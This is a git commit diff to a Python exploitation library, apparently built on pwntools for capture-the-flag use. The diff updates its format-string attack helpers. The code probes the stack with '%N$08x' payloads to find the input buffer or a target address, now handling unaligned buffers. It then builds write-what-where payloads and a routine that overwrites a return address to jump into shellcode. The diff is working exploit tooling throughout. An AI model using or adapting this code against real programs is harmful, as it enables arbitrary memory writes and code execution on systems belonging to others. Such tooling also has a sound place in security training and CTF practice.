2349809080e7e19a0541dac273d017bf8f966d0c
lp1719 <papandrea.luke@gmail.com>
2018-08-21 15:59:47 +1000

    Format strings now account for buffers not being word aligned

--- binary/papa_pwn/format_string.py
+++ binary/papa_pwn/format_string.py
@@ -13,15 +13,46 @@ class Format_String(Process):
         self.rop = ROP(self.elf)
 
         self.debug = True
-        self.max_stack_arg = 1000
+        self.max_stack_arg = 8
 
     ##########################################
     ##### General Format String Exploits #####
     ##########################################
+    
+    # Find a certain address
+    # Optional argument:
+    #   - f_exp: function(fstring, *args) -> output
+    def find_where_arg(self, where, buf_len=64, f_exp=None, *f_args):
+
+        # Default format string exploit function
+        if (f_exp == None):
+            f_exp = self.start_and_sendline_out
+
+        # Find which argument is the start of the buffer
+        base = 1
+        while (base < self.max_stack_arg-1):
+            payload = ""
+            # Fit inside the buffer the maximum format string
+            for i in xrange(base, self.max_stack_arg):
+                if (len(payload + "%{}$08x".format(i)) < buf_len):
+                    payload += "%{}$08x".format(i)
+                else:
+                    break
+            # Send the payload and see if the buffer is returned back
+            context.log_level = 'CRITICAL'
+            out = f_exp(payload, *f_args)
+            context.log_level = 'INFO'
+            if (out != None):
+                index = out.find("{:08x}".format(where))
+                if (index != -1):
+                    return base + (index / 8)
+            base = i 
+        return 0
 
     # Find where the user input is
     # Optional argument:
     #   - f_exp: function(fstring, *args) -> output
+    # Returns (arg_num, offset_into_buf)
     def find_buf_arg(self, buf_len=64, f_exp=None, *f_args):
 
         # Default format string exploit function
@@ -30,22 +61,37 @@ class Format_String(Process):
 
         # Find which argument is the start of the buffer
         base = 1
-        while (base < self.max_stack_arg):
+        while (base < self.max_stack_arg-1):
             payload = ""
             # Fit inside the buffer the maximum format string
             for i in xrange(base, self.max_stack_arg):
-                if (len(payload + "%{}$08x".format(i)) <= buf_len):
+                if (len(payload + "%{}$08x".format(i)) < buf_len):
                     payload += "%{}$08x".format(i)
                 else:
                     break
-            # Send the payload and see if the buffer is returned back
+            # Send the payload and get the output
+            context.log_level = 'CRITICAL'
             out = f_exp(payload, *f_args)
-            index = out.find("{:08x}".format(u32(payload[:4])))
-            if (index != -1):
-                return base + (index / 8)
-            else:
-                base = i 
-        return 0
+            context.log_level = 'INFO'
+
+            # Find the buffer and account for the start of the buffer not
+            # being word aligned.
+            # NOTE: could still fail if containing words are in seperate outputs
+            if (out != None):
+                index = out.find("{:08x}".format(u32(payload[:4])))
+                if (index != -1):
+                    return (base + (index / 8), 0)
+
+                for j in xrange(1, 4):
+                    regex = "{:x}{:s}".format(u32(payload[:j]+"\x00"*(4-j)), '.'*(2*(4-j)))
+                    regex += "{:s}{:x}".format('.'*(2*j), u32(payload[j:4]+"\x00"*j))
+                    match = re.search(regex, out)
+                    if (match != None):
+                        index = out.find(match.group(0))
+                        return (base + (index / 8) + 1, j)
+            base = i
+
+        return (0, 0)
 
     # Find where the user input is
     # Optional argument:
@@ -59,8 +105,10 @@ class Format_String(Process):
         # Find which argument is the pointer to the buffer
         for i in xrange(1, self.max_stack_arg):
             payload = "%{}$s".format(i)
+            context.log_level = 'CRITICAL'
             out = f_exp(payload, *f_args)
-            if (payload in out):
+            context.log_level = 'INFO'
+            if (out != None and payload in out):
                 return i
         return 0
 
@@ -74,8 +122,18 @@ class Format_String(Process):
         if (f_exp == None):
             f_exp = self.start_and_sendline_out
 
-        # Figure out what argument contains the start of our payload
-        arg = self.find_buf_arg(buf_len, f_exp, *f_args)
+        # Check if "where" is already on the stack
+        write_addr = False
+        arg = self.find_where_arg(where, buf_len, f_exp, *f_args)
+
+        # Otherwise figure out what argument contains the start of our payload
+        if (arg == 0):
+            write_addr = True
+            (arg, offset) = self.find_buf_arg(buf_len, f_exp, *f_args)
+
+        # If there is no way to reference "where" return None
+        if (arg == 0):
+            return None
 
         # If num_bytes is architecture dependant
         if (num_bytes == 0):
@@ -83,11 +141,12 @@ class Format_String(Process):
             if ("64" in self.arch):
                 num_bytes = 8 
 
-        # Add all the byte addresses for writing
-        payload = ""
-        for _unused in xrange(num_bytes):
-            payload += self.p(where)
-            where +=1
+        # Add all the byte addresses for writing if required
+        payload = "A"*offset
+        if (write_addr):
+            for _unused in xrange(num_bytes):
+                payload += self.p(where)
+                where +=1
 
         # Add all the writing format specifiers
         mask = 0xFF
@@ -104,6 +163,7 @@ class Format_String(Process):
             log.info("====================\n"+
                     "| What: "+hex(what)+'\n'+
                     "| Where: "+hex(where)+'\n'+
+                    "| Arg: "+str(arg)+'\n'+
                     "| Payload length: "+str(len(payload))+'\n'+
                     "| Payload: "+payload+'\n'+
                     "====================")
@@ -111,7 +171,7 @@ class Format_String(Process):
 
     # Generate payload to jump into own buffer shellcode.
     # Optional arguments:
-    #   - exploit_fstring: function(fstring, *args) -> output
+    #   - f_exp: function(fstring, *args) -> output
     def fstring_shellcode_jump(self, buf_addr, return_addr, buf_len=64, shellcode=None, f_exp=None, *f_args):
 
         # Default shellcode
@@ -123,7 +183,7 @@ class Format_String(Process):
             f_exp = self.start_and_sendline_out
 
         # Figure out what argument contains the start of our payload
-        arg = self.find_buf_arg(buf_len, f_exp, *f_args)
+        arg, offset = self.find_buf_arg(buf_len, f_exp, *f_args)
 
         # Based on the architecture determine the number of bytes to write
         num_to_write = 4
@@ -131,7 +191,7 @@ class Format_String(Process):
             num_to_write = 8
 
         # Add all the byte addresses for writing
-        payload = ""
+        payload = "A"*offset
         for _unused in xrange(num_to_write):
             payload += self.p(return_addr)
             return_addr +=1
